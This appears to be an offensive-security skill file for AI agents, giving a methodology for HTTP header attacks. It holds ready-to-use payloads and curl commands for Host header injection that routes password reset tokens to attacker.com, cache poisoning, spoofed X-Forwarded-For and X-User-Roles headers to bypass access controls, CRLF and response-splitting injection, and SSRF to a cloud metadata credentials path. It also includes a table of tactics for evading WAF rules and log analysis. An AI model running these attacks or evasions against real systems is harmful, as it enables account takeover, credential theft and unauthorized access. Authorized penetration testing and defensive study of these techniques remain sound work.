---
name: offensive-header-attacks
description: "HTTP header attack methodology — Host header injection (password reset abuse, web cache poisoning, virtual host confusion), X-Forwarded-* abuse (IP allowlist bypass, log injection, audit confusion), header smuggling for cache poisoning, request line injection / CRLF in headers, custom backend-trust headers (X-User-Id, X-Forwarded-User), Server-Side Request Forgery via header (Referer, User-Agent reflected into outbound request), and HTTP response splitting. Use when the engagement involves CDNs, reverse proxies, web application firewalls, or any architecture where multiple components parse the same request differently."
---

# HTTP Header Attacks

The HTTP header layer is where infrastructure components disagree about request parsing — load balancer vs. backend, CDN vs. origin, WAF vs. application. Each disagreement is an attack surface.

## Quick Workflow

1. Identify the request flow (CDN / proxy / WAF / backend)
2. For each header, ask: who reads it, who trusts it, who writes it
3. Test trust boundaries — backend trusting attacker-controlled headers
4. Test parser disagreement — duplicate / case-mutated / smuggled headers
5. Test reflection — headers echoed into responses or outbound requests

---

## Host Header Injection

The most common header attack. The backend uses `Host:` to build URLs.

### Password Reset URL Injection

```http
POST /password-reset
Host: attacker.com
{"email":"victim@target.com"}
```

If the app emails a reset link built from `Host:`, the link points to `attacker.com/?token=X` → victim clicks → attacker captures token.

### Cache Poisoning via Host

Some CDNs key cache by `Host` while origins ignore it:

```http
GET / HTTP/1.1
Host: attacker.com  (or)  X-Forwarded-Host: attacker.com
```

If the origin reflects `Host:` into the response (e.g. canonical URL, social meta tags), and the CDN caches that response under the legitimate hostname's key, every subsequent visitor gets attacker-controlled content.

### Web Cache Confuse

```http
GET /static/script.js HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

If the origin builds a 404 page including `attacker.com/whatever`, the CDN caches it under `/static/script.js` under target.com key.

### Header Variants

Test:
- `Host: attacker.com`
- `Host: target.com:81@attacker.com` (deprecated user-info parsing)
- `Host: target.com\nattacker.com` (CRLF)
- `Host: target.com.attacker.com`
- `X-Forwarded-Host: attacker.com`
- `X-Host: attacker.com`
- `X-Original-URL: /admin`
- `X-Rewrite-URL: /admin`

## X-Forwarded-* Trust

```http
GET /admin HTTP/1.1
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
```

If the backend trusts these for IP-based ACL ("admin only from 127.0.0.1"), spoofing grants access. Test against:

- Admin endpoints
- Internal API gateways behind a "trusted source" proxy
- Logging — log injection may corrupt audit trails

### IP-Spoofed Authentication

Some apps gate sensitive operations on "internal IP" via these headers. Setting any to a private range bypasses.

## Custom Backend-Trust Headers

API gateways often add internal headers after authentication:

```
X-User-Id: 1042
X-User-Email: user@target.com
X-User-Roles: user
X-Tenant: tenantA
```

If the backend trusts these without re-validating against a signed token, the attacker who can reach the backend (port forward, SSRF, internal network) can inject them.

```bash
# Curl to backend through SSRF or internal entrypoint
curl http://internal-backend/api/admin \
  -H "X-User-Id: 1" \
  -H "X-User-Roles: admin"
```

## Request Line / CRLF Injection

If user input is reflected into headers without sanitization:

```http
GET /api?lang=en%0d%0aSet-Cookie:%20admin=1 HTTP/1.1
```

If `lang` ends up in `Content-Language: en\r\nSet-Cookie: admin=1`, the response sets a cookie. Modern HTTP clients/servers reject most CRLF, but legacy or custom-parsed environments still bite.

## HTTP Response Splitting

Same family — inject CRLF + complete second response:

```
?redir=https://x.com%0d%0aHTTP/1.1%20200%20OK%0d%0a...
```

Combined with cache poisoning, the second response gets cached under the original URL.

## SSRF via Reflected Header

Endpoint that fetches URLs based on `Referer` or `User-Agent`:

```http
GET /api/log-referer
Referer: http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

If the server fetches the referer for OG-image preview or analytics, it hits IMDS — see `offensive-ssrf`.

## Cache Poisoning via Custom Headers

```http
GET /home HTTP/1.1
Host: target.com
X-Forwarded-Scheme: nothttps
```

If the origin uses `X-Forwarded-Scheme` to build redirect URLs, the response says `Location: http://target.com/home`. Cache stores this as the canonical → all visitors downgraded to HTTP.

```bash
# Param Miner (Burp extension) automates header cache poisoning probing
# Or pwn-cache-poison cli
pwn-cache-poison -u https://target.com -t 100
```

## "Forbidden Headers" Bypass

Browsers prevent JS from setting some headers (`Host`, `Cookie`, `Origin`). But:

- Service workers can sometimes set them
- Browser extensions can set arbitrary headers
- Direct attack from server-side tools always allowed
- Some CDNs strip / forward different sets

## Engagement Cheatsheet

```bash
# 1. Map the architecture
curl -v https://target.com/ 2>&1 | grep -i "via:\|server:\|cf-\|x-cache"

# 2. Test Host header on auth-related endpoints
curl https://target.com/password-reset -d 'email=x@y.com' \
  -H "Host: attacker.com"

# 3. Test X-Forwarded-* on admin endpoints
curl https://target.com/admin -H "X-Forwarded-For: 127.0.0.1"

# 4. Param Miner sweep for cache poisoning header keys
# (Burp → Param Miner → Guess headers)

# 5. Test backend internal headers if backend reachable
curl http://backend:8080/api/admin -H "X-User-Roles: admin"

# 6. Test CRLF injection in any header reflected in response
curl 'https://target.com/api?lang=en%0d%0aSet-Cookie:%20admin=1'
```

## Detection Considerations

| Defender Signal | Attacker Mitigation |
|---|---|
| WAF rule on common header injection patterns | Encode (URL, double-URL, Unicode) |
| Cache poisoning detection (varying responses for same key) | Test in canary regions, slow attempts |
| Log analysis of request lines with CRLF | Use header values not request URLs |

---

## Key References

- "Practical Web Cache Poisoning" — James Kettle (PortSwigger)
- "Cache Poisoning at Scale" — PortSwigger
- OWASP WSTG-INPV (Input Validation including header)
- Param Miner: github.com/PortSwigger/param-miner
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/header-attacks.md
